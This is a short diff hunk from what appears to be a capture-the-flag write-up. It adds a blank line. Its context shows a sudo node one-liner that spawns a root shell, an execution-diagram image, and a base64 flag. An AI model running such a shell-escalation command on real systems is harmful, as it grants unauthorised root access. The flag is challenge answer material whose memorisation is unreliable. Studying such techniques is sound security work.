@@ -83,6 +83,7 @@ $ sudo node -e 'require("child_process").spawn("/bin/sh", {stdio: [0, 1, 2]})'
 ```
 **`Execution diagram`**
 <p align="center"><img src="https://drive.google.com/uc?export=view&id=1iwHlQc8Gl9fvGv-oV7CMMLNU5yXst9Yy"></img></p>
+
 **`Flag`**
 ```bash
 > YXBvcHNlIHNpb3BpIG1hemV1b3VtZSBvbmVpcmEK
